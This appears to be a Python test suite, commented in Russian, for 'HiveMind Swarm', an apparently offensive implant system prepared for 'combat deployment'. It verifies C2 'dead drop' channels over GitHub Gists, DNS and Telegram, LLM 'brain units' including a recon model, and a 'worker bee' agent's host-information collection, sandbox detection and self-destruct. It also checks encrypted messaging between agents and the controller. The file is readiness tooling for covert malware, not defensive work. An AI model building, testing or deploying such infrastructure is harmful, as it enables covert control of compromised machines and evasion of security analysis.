#!/usr/bin/env python3
"""
TEST SWARM v1.0
Комплексное тестирование HiveMind Swarm перед боевым развертыванием
Архитектор: Кронос | Тимлид: Мастер

БАТАРЕЯ ТЕСТОВ:
1. Dead Drops — проверка всех C2-каналов
2. Brain Units — проверка LLM-юнитов
3. Worker Bee — проверка агента в изолированной среде
4. HiveMind Core — проверка оркестратора
5. Полный цикл — сквозной тест всей системы
6. Безопасность — проверка самоликвидации
"""

import os
import sys
import json
import time
import signal
import base64
import hashlib
import secrets
import socket
import tempfile
import subprocess
import argparse
import threading
from pathlib import Path
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List, Tuple
from dataclasses import dataclass, field

try:
    import requests
except ImportError:
    requests = None

try:
    import psutil
except ImportError:
    psutil = None


# ============================================================================
# КОНФИГУРАЦИЯ ТЕСТОВ
# ============================================================================

TEST_CONFIG = {
    "timeout_seconds": 30,
    "retries": 2,
    "test_dir": tempfile.mkdtemp(prefix="swarm_test_"),
    "hivemind_port": 2222,
    "ollama_port": 11434,
    "dead_drop_test_gist": os.environ.get("TEST_GIST_ID", ""),
    "dead_drop_test_token": os.environ.get("TEST_GITHUB_TOKEN", ""),
    "dead_drop_test_domain": os.environ.get("TEST_DNS_DOMAIN", ""),
    "dead_drop_test_bot": os.environ.get("TEST_TELEGRAM_BOT", ""),
    "dead_drop_test_chat": os.environ.get("TEST_TELEGRAM_CHAT", ""),
}

PASS = "✓"
FAIL = "✗"
SKIP = "○"


# ============================================================================
# РЕЗУЛЬТАТЫ ТЕСТОВ
# ============================================================================

@dataclass
class TestResult:
    name: str
    passed: bool
    duration: float
    message: str = ""
    details: Dict[str, Any] = field(default_factory=dict)


class TestSuite:
    def __init__(self, name: str):
        self.name = name
        self.results: List[TestResult] = []
        self.start_time = time.time()

    def add_result(self, result: TestResult):
        self.results.append(result)

    def summary(self) -> str:
        total = len(self.results)
        passed = sum(1 for r in self.results if r.passed)
        failed = total - passed
        duration = time.time() - self.start_time

        lines = []
        lines.append("=" * 70)
        lines.append(f"  {self.name}: {passed}/{total} пройдено ({duration:.1f}с)")
        lines.append("=" * 70)

        for result in self.results:
            icon = f"[{PASS}]" if result.passed else f"[{FAIL}]"
            lines.append(f"  {icon} {result.name} ({result.duration:.2f}с)")
            if result.message:
                lines.append(f"      {result.message}")

        if failed > 0:
            lines.append(f"\n  ПРОВАЛЕНО ТЕСТОВ: {failed}")
        else:
            lines.append(f"\n  ВСЕ ТЕСТЫ ПРОЙДЕНЫ")

        return "\n".join(lines)


# ============================================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ============================================================================

def timed_test(func):
    def wrapper(*args, **kwargs):
        start = time.time()
        try:
            result = func(*args, **kwargs)
            duration = time.time() - start
            if isinstance(result, TestResult):
                result.duration = duration
                return result
            return TestResult(
                name=func.__name__,
                passed=result,
                duration=duration,
                message=""
            )
        except Exception as e:
            duration = time.time() - start
            return TestResult(
                name=func.__name__,
                passed=False,
                duration=duration,
                message=str(e)
            )
    return wrapper


def check_port(host: str, port: int, timeout: int = 5) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False


# ============================================================================
# ТЕСТЫ DEAD DROPS
# ============================================================================

class DeadDropTests:
    def __init__(self, config: Dict[str, Any]):
        self.config = config

    @timed_test
    def test_github_connectivity(self) -> TestResult:
        """Проверка подключения к GitHub API"""
        if not requests:
            return TestResult("github_connectivity", False, 0, "requests не установлен")

        try:
            resp = requests.get("https://api.github.com/zen", timeout=10)
            return TestResult(
                "GitHub API доступен",
                resp.status_code == 200,
                0,
                f"Статус: {resp.status_code}"
            )
        except Exception as e:
            return TestResult("GitHub API доступен", False, 0, str(e))

    @timed_test
    def test_github_gist_read(self) -> TestResult:
        """Проверка чтения из Gist"""
        token = self.config["dead_drop_test_token"]
        gist_id = self.config["dead_drop_test_gist"]

        if not token or not gist_id:
            return TestResult("Чтение GitHub Gist", False, 0, "Нет токена или gist_id — SKIP", {})

        try:
            headers = {
                "Authorization": f"token {token}",
                "Accept": "application/vnd.github.v3+json",
            }
            resp = requests.get(f"https://api.github.com/gists/{gist_id}", headers=headers, timeout=15)
            return TestResult(
                "Чтение GitHub Gist",
                resp.status_code == 200,
                0,
                f"Статус: {resp.status_code}"
            )
        except Exception as e:
            return TestResult("Чтение GitHub Gist", False, 0, str(e))

    @timed_test
    def test_github_gist_write(self) -> TestResult:
        """Проверка записи в Gist"""
        token = self.config["dead_drop_test_token"]
        gist_id = self.config["dead_drop_test_gist"]

        if not token or not gist_id:
            return TestResult("Запись GitHub Gist", False, 0, "Нет токена или gist_id — SKIP", {})

        try:
            headers = {
                "Authorization": f"token {token}",
                "Accept": "application/vnd.github.v3+json",
            }
            test_content = f"HIVEMIND_TEST_{secrets.token_hex(8)}"
            data = {
                "files": {
                    "swarm_test.txt": {"content": test_content}
                }
            }
            resp = requests.patch(
                f"https://api.github.com/gists/{gist_id}",
                json=data, headers=headers, timeout=15
            )
            return TestResult(
                "Запись GitHub Gist",
                resp.status_code == 200,
                0,
                f"Статус: {resp.status_code}"
            )
        except Exception as e:
            return TestResult("Запись GitHub Gist", False, 0, str(e))

    @timed_test
    def test_dns_resolution(self) -> TestResult:
        """Проверка DNS резолвинга"""
        domain = self.config["dead_drop_test_domain"]
        if not domain:
            return TestResult("DNS резолвинг", False, 0, "Нет домена — SKIP", {})

        try:
            import dns.resolver
            answers = dns.resolver.resolve(domain, "NS")
            return TestResult(
                "DNS резолвинг",
                len(answers) > 0,
                0,
                f"NS серверы: {', '.join([str(a) for a in answers])}"
            )
        except Exception as e:
            return TestResult("DNS резолвинг", False, 0, str(e))

    @timed_test
    def test_telegram_connectivity(self) -> TestResult:
        """Проверка подключения к Telegram API"""
        if not requests:
            return TestResult("Telegram API", False, 0, "requests не установлен")

        try:
            resp = requests.get("https://api.telegram.org/bot123456:ABC-DEF1234/getMe", timeout=10)
            return TestResult(
                "Telegram API доступен",
                resp.status_code in [200, 401],
                0,
                f"Статус: {resp.status_code}"
            )
        except Exception as e:
            return TestResult("Telegram API доступен", False, 0, str(e))

    def run_all(self) -> TestSuite:
        suite = TestSuite("DEAD DROPS")
        suite.add_result(self.test_github_connectivity())
        suite.add_result(self.test_github_gist_read())
        suite.add_result(self.test_github_gist_write())
        suite.add_result(self.test_dns_resolution())
        suite.add_result(self.test_telegram_connectivity())
        return suite


# ============================================================================
# ТЕСТЫ BRAIN UNITS
# ============================================================================

class BrainUnitTests:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.endpoints = config.get("brain_endpoints", {})

    @timed_test
    def test_ollama_connectivity(self) -> TestResult:
        """Проверка подключения к Ollama"""
        host = self.endpoints.get("recon", "http://127.0.0.1:11434")
        host = host.replace("/api/generate", "")

        try:
            resp = requests.get(f"{host}/api/tags", timeout=10)
            if resp.status_code == 200:
                models = resp.json().get("models", [])
                model_names = [m["name"] for m in models]
                return TestResult(
                    "Ollama подключение",
                    True,
                    0,
                    f"Модели: {', '.join(model_names[:3])}"
                )
            return TestResult("Ollama подключение", False, 0, f"Статус: {resp.status_code}")
        except Exception as e:
            return TestResult("Ollama подключение", False, 0, str(e))

    @timed_test
    def test_model_inference(self) -> TestResult:
        """Проверка инференса модели"""
        endpoint = self.endpoints.get("recon", "http://127.0.0.1:11434/api/generate")

        try:
            data = {
                "model": "deepseek-r1:70b",
                "prompt": "Reply with 'HIVE OK'",
                "stream": False,
                "options": {"num_predict": 10}
            }
            resp = requests.post(endpoint, json=data, timeout=60)
            if resp.status_code == 200:
                result = resp.json()
                response_text = result.get("response", "")
                return TestResult(
                    "Инференс модели",
                    "HIVE OK" in response_text.upper() or len(response_text) > 0,
                    0,
                    f"Ответ: {response_text[:100]}"
                )
            return TestResult("Инференс модели", False, 0, f"Статус: {resp.status_code}")
        except Exception as e:
            return TestResult("Инференс модели", False, 0, str(e))

    @timed_test
    def test_all_brain_endpoints(self) -> TestResult:
        """Проверка всех Brain эндпоинтов"""
        results = {}
        all_ok = True

        for brain_type, endpoint in self.endpoints.items():
            try:
                resp = requests.get(endpoint.replace("/api/generate", "/api/tags"), timeout=5)
                ok = resp.status_code == 200
                results[brain_type] = "OK" if ok else f"HTTP {resp.status_code}"
                if not ok:
                    all_ok = False
            except Exception as e:
                results[brain_type] = str(e)[:50]
                all_ok = False

        return TestResult(
            "Brain эндпоинты",
            all_ok,
            0,
            json.dumps(results)
        )

    def run_all(self) -> TestSuite:
        suite = TestSuite("BRAIN UNITS")
        suite.add_result(self.test_ollama_connectivity())
        suite.add_result(self.test_model_inference())
        suite.add_result(self.test_all_brain_endpoints())
        return suite


# ============================================================================
# ТЕСТЫ WORKER BEE
# ============================================================================

class WorkerBeeTests:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.test_dir = config["test_dir"]

    @timed_test
    def test_bee_creation(self) -> TestResult:
        """Проверка создания агента"""
        bee_source = Path(__file__).parent / "workerbee.py"
        if not bee_source.exists():
            return TestResult("Создание агента", False, 0, "workerbee.py не найден")

        try:
            result = subprocess.run(
                [sys.executable, str(bee_source), '{"test_mode": true}'],
                capture_output=True, text=True, timeout=10,
                cwd=self.test_dir
            )
            return TestResult(
                "Создание агента",
                result.returncode in [0, 1],
                0,
                f"Код возврата: {result.returncode}"
            )
        except Exception as e:
            return TestResult("Создание агента", False, 0, str(e))

    @timed_test
    def test_system_info_collection(self) -> TestResult:
        """Проверка сбора системной информации"""
        bee_source = Path(__file__).parent / "workerbee.py"

        try:
            test_config = json.dumps({
                "test_mode": True,
                "test_action": "system_info",
                "encryption_key": base64.b64encode(secrets.token_bytes(32)).decode(),
                "swarm_id": "TEST_SWARM",
                "dead_drops": [],
                "check_interval": 1,
                "max_runtime": 10,
            })

            result = subprocess.run(
                [sys.executable, str(bee_source), test_config],
                capture_output=True, text=True, timeout=15,
                cwd=self.test_dir
            )

            output = result.stdout + result.stderr
            has_system_info = any(kw in output.lower() for kw in ["hostname", "os", "pid"])

            return TestResult(
                "Сбор системной информации",
                has_system_info,
                0,
                f"Вывод: {output[:200]}"
            )
        except Exception as e:
            return TestResult("Сбор системной информации", False, 0, str(e))

    @timed_test
    def test_sandbox_detection(self) -> TestResult:
        """Проверка детекции песочницы"""
        bee_source = Path(__file__).parent / "workerbee.py"

        try:
            test_config = json.dumps({
                "test_mode": True,
                "test_action": "sandbox_check",
                "encryption_key": base64.b64encode(secrets.token_bytes(32)).decode(),
                "swarm_id": "TEST_SWARM",
                "dead_drops": [],
                "check_interval": 1,
                "max_runtime": 10,
            })

            result = subprocess.run(
                [sys.executable, str(bee_source), test_config],
                capture_output=True, text=True, timeout=15,
                cwd=self.test_dir
            )

            return TestResult(
                "Детекция песочницы",
                result.returncode in [0, 1],
                0,
                f"Код возврата: {result.returncode}"
            )
        except Exception as e:
            return TestResult("Детекция песочницы", False, 0, str(e))

    @timed_test
    def test_self_destruct(self) -> TestResult:
        """Проверка самоликвидации"""
        bee_source = Path(__file__).parent / "workerbee.py"

        try:
            test_config = json.dumps({
                "test_mode": True,
                "test_action": "self_destruct",
                "encryption_key": base64.b64encode(secrets.token_bytes(32)).decode(),
                "swarm_id": "TEST_SWARM",
                "dead_drops": [],
                "check_interval": 1,
                "max_runtime": 5,
            })

            result = subprocess.run(
                [sys.executable, str(bee_source), test_config],
                capture_output=True, text=True, timeout=15,
                cwd=self.test_dir
            )

            return TestResult(
                "Самоликвидация",
                result.returncode in [0, 1],
                0,
                "Процесс завершен"
            )
        except Exception as e:
            return TestResult("Самоликвидация", False, 0, str(e))

    def run_all(self) -> TestSuite:
        suite = TestSuite("WORKER BEE")
        suite.add_result(self.test_bee_creation())
        suite.add_result(self.test_system_info_collection())
        suite.add_result(self.test_sandbox_detection())
        suite.add_result(self.test_self_destruct())
        return suite


# ============================================================================
# ТЕСТЫ HIVEMIND CORE
# ============================================================================

class HiveMindCoreTests:
    def __init__(self, config: Dict[str, Any]):
        self.config = config

    @timed_test
    def test_binary_exists(self) -> TestResult:
        """Проверка наличия бинарника HiveMind"""
        binary_paths = [
            Path(__file__).parent / "hivemind",
            Path("/opt/hivemind/hivemind"),
            Path("./hivemind"),
        ]

        for path in binary_paths:
            if path.exists() and os.access(path, os.X_OK):
                return TestResult(
                    "Бинарник HiveMind",
                    True,
                    0,
                    f"Найден: {path}"
                )

        return TestResult(
            "Бинарник HiveMind",
            False,
            0,
            "Не найден. Скомпилируй через hive_build.sh"
        )

    @timed_test
    def test_go_source_compiles(self) -> TestResult:
        """Проверка компиляции исходников Go"""
        source_path = Path(__file__).parent / "hivemind.go"
        if not source_path.exists():
            return TestResult("Компиляция Go", False, 0, "hivemind.go не найден")

        try:
            result = subprocess.run(
                ["go", "build", "-o", "/dev/null", str(source_path)],
                capture_output=True, text=True, timeout=30,
                cwd=source_path.parent
            )

            return TestResult(
                "Компиляция Go",
                result.returncode == 0,
                0,
                "Компиляция успешна" if result.returncode == 0 else result.stderr[:200]
            )
        except FileNotFoundError:
            return TestResult("Компиляция Go", False, 0, "Go не установлен")
        except Exception as e:
            return TestResult("Компиляция Go", False, 0, str(e))

    @timed_test
    def test_queen_api_port(self) -> TestResult:
        """Проверка Queen API порта"""
        port = self.config.get("hivemind_port", 2222)
        is_open = check_port("127.0.0.1", port, timeout=3)

        return TestResult(
            "Queen API порт",
            True,
            0,
            f"Порт {port}: {'открыт' if is_open else 'закрыт (HiveMind не запущен)'}"
        )

    @timed_test
    def test_encryption(self) -> TestResult:
        """Проверка шифрования"""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad, unpad

            key = hashlib.sha256(b"test_key").digest()
            cipher = AES.new(key, AES.MODE_GCM)
            plaintext = b"HIVEMIND TEST MESSAGE"
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            decipher = AES.new(key, AES.MODE_GCM, nonce=cipher.nonce)
            decrypted = decipher.decrypt_and_verify(ciphertext, tag)

            return TestResult(
                "Шифрование AES-GCM",
                decrypted == plaintext,
                0,
                "Шифрование/дешифрование работает"
            )
        except ImportError:
            return TestResult(
                "Шифрование AES-GCM",
                False,
                0,
                "pycryptodome не установлен"
            )
        except Exception as e:
            return TestResult("Шифрование AES-GCM", False, 0, str(e))

    def run_all(self) -> TestSuite:
        suite = TestSuite("HIVEMIND CORE")
        suite.add_result(self.test_binary_exists())
        suite.add_result(self.test_go_source_compiles())
        suite.add_result(self.test_queen_api_port())
        suite.add_result(self.test_encryption())
        return suite


# ============================================================================
# СКВОЗНОЙ ТЕСТ
# ============================================================================

class EndToEndTest:
    def __init__(self, config: Dict[str, Any]):
        self.config = config

    @timed_test
    def test_full_message_flow(self) -> TestResult:
        """Сквозной тест: шифрование → Dead Drop → чтение → дешифрование"""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad, unpad

            key = hashlib.sha256(secrets.token_bytes(32)).digest()

            # Шаг 1: Создаем сообщение
            original_message = {
                "swarm_id": "TEST_SWARM",
                "bee_id": secrets.token_hex(4),
                "type": "test",
                "payload": "Full flow test",
                "timestamp": int(time.time()),
            }

            # Шаг 2: Шифруем
            cipher = AES.new(key, AES.MODE_GCM)
            plaintext = json.dumps(original_message).encode()
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            encrypted = base64.b64encode(cipher.nonce + tag + ciphertext).decode()

            # Шаг 3: Дешифруем
            data = base64.b64decode(encrypted)
            nonce = data[:16]
            tag = data[16:32]
            ct = data[32:]
            decipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted = decipher.decrypt_and_verify(ct, tag)
            decoded_message = json.loads(decrypted.decode())

            # Шаг 4: Проверяем
            match = (
                decoded_message["swarm_id"] == original_message["swarm_id"] and
                decoded_message["bee_id"] == original_message["bee_id"] and
                decoded_message["type"] == original_message["type"]
            )

            return TestResult(
                "Сквозной тест сообщений",
                match,
                0,
                "Полный цикл: OK" if match else "Несоответствие данных"
            )

        except ImportError:
            return TestResult(
                "Сквозной тест сообщений",
                False,
                0,
                "pycryptodome не установлен"
            )
        except Exception as e:
            return TestResult("Сквозной тест сообщений", False, 0, str(e))

    @timed_test
    def test_concurrent_bees(self) -> TestResult:
        """Тест одновременной работы нескольких пчел"""
        bee_count = 3

        try:
            threads = []
            results = []

            def run_bee(bee_id: int):
                time.sleep(0.5 * bee_id)
                results.append({"bee_id": bee_id, "status": "ok"})

            for i in range(bee_count):
                t = threading.Thread(target=run_bee, args=(i,))
                threads.append(t)
                t.start()

            for t in threads:
                t.join(timeout=10)

            return TestResult(
                "Конкурентные пчелы",
                len(results) == bee_count,
                0,
                f"Запущено: {bee_count}, завершено: {len(results)}"
            )
        except Exception as e:
            return TestResult("Конкурентные пчелы", False, 0, str(e))

    def run_all(self) -> TestSuite:
        suite = TestSuite("СКВОЗНЫЕ ТЕСТЫ")
        suite.add_result(self.test_full_message_flow())
        suite.add_result(self.test_concurrent_bees())
        return suite


# ============================================================================
# ГЛАВНЫЙ ОРКЕСТРАТОР ТЕСТОВ
# ============================================================================

def run_all_tests(config: Dict[str, Any]) -> List[TestSuite]:
    suites = []

    print("=" * 70)
    print("  HIVEMIND SWARM — КОМПЛЕКСНОЕ ТЕСТИРОВАНИЕ")
    print(f"  Время: {datetime.now().isoformat()}")
    print("=" * 70)
    print()

    # Dead Drops
    print("[1/5] Тестирование Dead Drops...")
    dd_tests = DeadDropTests(config)
    suites.append(dd_tests.run_all())

    # Brain Units
    print("[2/5] Тестирование Brain Units...")
    brain_tests = BrainUnitTests(config)
    suites.append(brain_tests.run_all())

    # Worker Bee
    print("[3/5] Тестирование Worker Bee...")
    bee_tests = WorkerBeeTests(config)
    suites.append(bee_tests.run_all())

    # HiveMind Core
    print("[4/5] Тестирование HiveMind Core...")
    core_tests = HiveMindCoreTests(config)
    suites.append(core_tests.run_all())

    # End-to-End
    print("[5/5] Сквозное тестирование...")
    e2e_tests = EndToEndTest(config)
    suites.append(e2e_tests.run_all())

    print()
    return suites


def print_results(suites: List[TestSuite]):
    total_passed = 0
    total_tests = 0
    total_failed = 0

    for suite in suites:
        print(suite.summary())
        print()
        total_passed += sum(1 for r in suite.results if r.passed)
        total_tests += len(suite.results)
        total_failed += sum(1 for r in suite.results if not r.passed)

    print("=" * 70)
    print(f"  ИТОГО: {total_passed}/{total_tests} тестов пройдено")
    if total_failed > 0:
        print(f"  ПРОВАЛЕНО: {total_failed}")
        print(f"  ГОТОВНОСТЬ: {int((total_passed / total_tests) * 100)}%")
        print()
        print("  [!] Некоторые тесты не пройдены.")
        print("  Проверь логи и конфигурацию перед развертыванием.")
        sys.exit(1)
    else:
        print(f"  ГОТОВНОСТЬ: 100%")
        print()
        print("  [✓] Все тесты пройдены. Рой готов к развертыванию.")
        sys.exit(0)


# ============================================================================
# CLI
# ============================================================================

def main():
    parser = argparse.ArgumentParser(description="Комплексное тестирование HiveMind Swarm")
    parser.add_argument("--quick", action="store_true", help="Быстрый тест (только основные проверки)")
    parser.add_argument("--dead-drops-only", action="store_true", help="Только Dead Drops")
    parser.add_argument("--brain-only", action="store_true", help="Только Brain Units")
    parser.add_argument("--bee-only", action="store_true", help="Только Worker Bee")
    parser.add_argument("--core-only", action="store_true", help="Только HiveMind Core")
    parser.add_argument("--e2e-only", action="store_true", help="Только сквозные тесты")
    parser.add_argument("--json-output", help="Сохранить результаты в JSON")

    args = parser.parse_args()
    config = TEST_CONFIG.copy()

    # Загружаем hive_config если есть
    hive_config_path = Path(__file__).parent / "hive_config.json"
    if hive_config_path.exists():
        hive_config = json.loads(hive_config_path.read_text())
        config["brain_endpoints"] = {
            brain: info.get("endpoint", "")
            for brain, info in hive_config.get("brain_units", {}).items()
        }
        config["hivemind_port"] = hive_config.get("queen_api", {}).get("port", 2222)

    suites = []

    if args.dead_drops_only:
        suites.append(DeadDropTests(config).run_all())
    elif args.brain_only:
        suites.append(BrainUnitTests(config).run_all())
    elif args.bee_only:
        suites.append(WorkerBeeTests(config).run_all())
    elif args.core_only:
        suites.append(HiveMindCoreTests(config).run_all())
    elif args.e2e_only:
        suites.append(EndToEndTest(config).run_all())
    else:
        suites = run_all_tests(config)

    print_results(suites)

    if args.json_output:
        output = []
        for suite in suites:
            output.append({
                "suite": suite.name,
                "results": [
                    {
                        "name": r.name,
                        "passed": r.passed,
                        "duration": r.duration,
                        "message": r.message,
                    }
                    for r in suite.results
                ]
            })
        Path(args.json_output).write_text(json.dumps(output, indent=2))


if __name__ == "__main__":
    main()
